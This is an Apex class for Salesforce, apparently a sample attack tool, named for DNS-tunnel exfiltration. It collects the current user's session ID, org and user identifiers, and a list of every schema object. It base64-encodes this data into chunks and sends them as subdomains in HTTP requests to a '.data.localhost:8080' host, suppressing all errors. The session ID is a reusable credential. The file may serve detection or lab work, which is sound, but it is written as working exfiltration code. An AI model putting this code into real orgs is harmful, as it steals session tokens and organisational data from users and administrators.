public class Exfil_DNSTunnel {
    private static final String DNS_EXFIL_DOMAIN = '.data.localhost:8080';
    private static final Integer CHUNK_SIZE = 60;

    public static void exfilViaHTTPDNS(String sensitiveData) {
        String encoded = EncodingUtil.base64Encode(Blob.valueOf(sensitiveData))
            .replace('+', '-').replace('/', '_').replace('=', '');

        Integer chunks = (encoded.length() + CHUNK_SIZE - 1) / CHUNK_SIZE;
        Http http = new Http();

        for (Integer i = 0; i < chunks; i++) {
            Integer startIdx = i * CHUNK_SIZE;
            Integer endIdx = Math.min(startIdx + CHUNK_SIZE, encoded.length());
            String chunk = encoded.substring(startIdx, endIdx);

            HttpRequest req = new HttpRequest();
            req.setEndpoint('https://' + chunk + '.' + String.valueOf(i) + DNS_EXFIL_DOMAIN);
            req.setMethod('GET');
            req.setTimeout(2000);
            try {
                http.send(req);
            } catch (Exception e) {
            }
        }
    }

    public static void exfilOrgData() {
        String payload = JSON.serialize(new Map<String, String>{
            'orgId' => UserInfo.getOrganizationId(),
            'userId' => UserInfo.getUserId(),
            'sessionId' => UserInfo.getSessionId(),
            'orgName' => UserInfo.getOrganizationName(),
            'userName' => UserInfo.getUserName(),
            'profileId' => UserInfo.getProfileId()
        });
        exfilViaHTTPDNS(payload);
    }

    public static void exfilSchemaInfo() {
        Map<String, Schema.SObjectType> globalDescribe = Schema.getGlobalDescribe();
        String schemaInfo = '';
        for (String objName : globalDescribe.keySet()) {
            schemaInfo += objName + ',';
        }
        exfilViaHTTPDNS(schemaInfo);
    }
}
